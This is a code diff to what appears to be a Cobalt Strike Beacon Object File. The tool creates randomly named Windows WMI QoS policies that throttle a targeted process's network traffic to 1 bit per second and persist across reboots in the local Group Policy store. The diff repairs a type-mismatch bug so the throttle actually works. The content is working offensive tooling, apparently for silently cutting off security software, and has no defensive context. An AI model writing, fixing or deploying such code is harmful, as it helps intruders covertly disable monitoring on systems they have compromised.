@@ -102,6 +102,12 @@ static HRESULT PutByte(IWbemClassObject* o, const wchar_t* p, BYTE v) {
     HRESULT hr = o->lpVtbl->Put(o, p, 0, &var, 0);
     OLEAUT32$VariantClear(&var); return hr;
 }
+static HRESULT PutI8(IWbemClassObject* o, const wchar_t* p, LONGLONG v) {
+    VARIANT var; OLEAUT32$VariantInit(&var);
+    var.vt = VT_I8; var.llVal = v;
+    HRESULT hr = o->lpVtbl->Put(o, p, 0, &var, 0);
+    OLEAUT32$VariantClear(&var); return hr;
+}
 
 static BOOL SpawnWmiInst(IWbemServices* svc, const wchar_t* cls,
                           IWbemClassObject** ppOut) {
@@ -130,13 +136,16 @@ static BOOL CreatePolicyInStore(IWbemServices* svc, const wchar_t* proc,
     ip = WAppend(instId, ip, 48, store);
     instId[ip] = L'\0';
 
-    PutBstr(pInst, L"Name",                      name);
-    PutBstr(pInst, L"InstanceID",                instId);
-    PutBstr(pInst, L"AppPathNameMatchCondition",  proc);
-    PutBstr(pInst, L"ThrottleRateAction",         L"8");
-    PutByte(pInst, L"IPProtocolMatchCondition",   3);
-    PutByte(pInst, L"NetworkProfile",             0);
-    PutBstr(pInst, L"Owner",                      L"machine");
+    PutBstr(pInst, L"Name",                          name);
+    PutBstr(pInst, L"InstanceID",                    instId);
+    PutBstr(pInst, L"AppPathNameMatchCondition",     proc);
+    /* ThrottleRateActionBitsPerSecond (uint64) = 1 bit/sec ≈ zero bandwidth.
+     * ThrottleRateAction is a read-only display string populated by the provider
+     * from ThrottleRateActionBitsPerSecond — setting it as BSTR causes
+     * WBEM_E_TYPE_MISMATCH and silently leaves throttle at unlimited. */
+    PutI8  (pInst, L"ThrottleRateActionBitsPerSecond", 1LL);
+    PutByte(pInst, L"IPProtocolMatchCondition",      3);
+    PutByte(pInst, L"NetworkProfile",                0);
 
     HRESULT hr = svc->lpVtbl->PutInstance(svc, pInst,
         WBEM_FLAG_CREATE_OR_UPDATE, NULL, NULL);
@@ -150,9 +159,9 @@ static BOOL CreatePolicyInStore(IWbemServices* svc, const wchar_t* proc,
 
 static BOOL CreatePolicy(IWbemServices* svc, const wchar_t* proc) {
     wchar_t name[9]; RandName(name, 8);
-    /* ActiveStore write is sufficient — provider stores it as GPO:localhost
-     * which is the local Group Policy QoS store and persists across reboots. */
-    if (!CreatePolicyInStore(svc, proc, name, L"ActiveStore")) {
+    /* GPO:localhost = local machine Group Policy QoS store — persists across reboots.
+     * InstanceID key must use this exact store name or the provider rejects the instance. */
+    if (!CreatePolicyInStore(svc, proc, name, L"GPO:localhost")) {
         BeaconPrintf(CALLBACK_ERROR, "  [-] %S: PutInstance failed\n", proc);
         return FALSE;
     }
